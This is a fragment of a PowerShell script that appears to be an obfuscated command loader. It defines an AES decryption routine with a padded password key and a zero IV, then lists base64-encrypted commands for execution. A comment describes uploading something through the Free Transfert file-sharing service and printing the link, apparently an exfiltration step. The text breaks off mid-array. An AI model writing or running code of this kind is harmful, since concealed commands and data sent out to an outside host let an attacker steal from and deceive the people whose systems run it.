# first.txt

function Decrypt-String {
    param(
        [string]$CipherTextBase64,
        [string]$Password
    )

    # 1) force $Password to exactly 32 chars
    $padded    = ($Password.PadRight(32)).Substring(0,32)
    # 2) UTF8 bytes → 256-bit key
    $keyBytes  = [System.Text.Encoding]::UTF8.GetBytes($padded)
    # 3) zero IV
    $iv        = New-Object byte[] 16

    # 4) decrypt the blob
    $cipherBytes = [Convert]::FromBase64String($CipherTextBase64)
    $aes         = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key     = $keyBytes
    $aes.IV      = $iv

    $decryptor = $aes.CreateDecryptor()
    $ms        = New-Object System.IO.MemoryStream(,$cipherBytes)
    $cs        = New-Object System.Security.Cryptography.CryptoStream(
                     $ms, $decryptor,
                     [System.Security.Cryptography.CryptoStreamMode]::Read
                  )
    $sr    = New-Object System.IO.StreamReader($cs)
    $plain = $sr.ReadToEnd()
    $sr.Close(); $cs.Close(); $ms.Close()
    return $plain
}

$EncryptedCommands = @(

    '1Afgn9y2LnD1emDCHXVtgp5NoG/P8A1Q3YeXkUhfofXaUWAHOBJrHBlZdbOrwi8r0f3hBr4Ti8oXZ+sPbS6OQ3TAX69OG/P8KLnlxxiCRe80p3rcC0MEfcfptEc8a5ArI6EbYG7gpzt4Fy5qv0vrJ0r88L23o5j6wZ0lrCkcdSrh2xdN/OVF3pto96vlBsl7v7BaUEYGDN2cR3fVdl99HMu81EzXc2QumH72fyUCtlN/uYMm0lsPYUs3Vor+Fk1fOYGTDPMyNxz4VVMf4JHeIQ==',

    # ── 2) Upload it via Free Transfert and print the link
    @'
